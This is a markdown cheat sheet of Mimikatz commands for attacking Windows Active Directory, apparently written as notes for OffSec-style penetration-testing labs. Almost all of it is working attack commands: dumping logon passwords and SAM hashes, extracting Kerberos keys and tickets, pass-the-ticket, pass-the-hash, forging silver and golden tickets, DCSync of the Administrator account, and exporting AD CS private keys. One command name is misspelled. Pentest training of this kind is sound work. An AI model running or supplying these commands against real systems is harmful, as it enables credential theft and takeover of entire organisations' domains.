---
tags:
  - tool
  - windows
  - active_directory
---
# Mimikatz

Exploit Windows security - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## Methodology

```bash
# Grab mimikatz.exe in kali
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

## Capabilities

```bash
# Allow command execution as another user (RUN BEFORE ALL OTHER COMMANDS)
privilege::debug

# Dump credentials for all users logged on to the current workstation or server, including remote logins
sekurlsa::logonpasswords

# Dump credentials for local accounts
token::elevate
lsadump::sam
token::revert

# Extract kerberos encryption keys
sekurlsa::ekeys

# Extract kerberos tickets (first request is made in a normal shell to cache a service ticket)
# Used in Pass the Ticket and _ attacks
dir \\web04.offsec.local\backup
sekrulsa::tickets /export

# Check exported tickets and inject one (first command made in normal shell)
dir *.kirbi
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
# Check if injected ticket was loaded properly (made in normal shell)
klist

# Perform a pass-the-hash attack
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

# Create a silver ticket
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

# Create golden ticket (/patch is used to include the krbtgt hash in the output of lsadump::lsa)
lsadump::lsa /patch
# Purge all tickets before creating the golden ticket to avoid conflicting tickets
kerberos::purge
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd

# Use DCSync to grab a users credentials
lsadump::dcsync /user:corp\Administrator

# Export private AD CS keys
crypto::capi
crypto::cng
```

Reminder: We can grab our user SID at any point with the command `whoami /user`
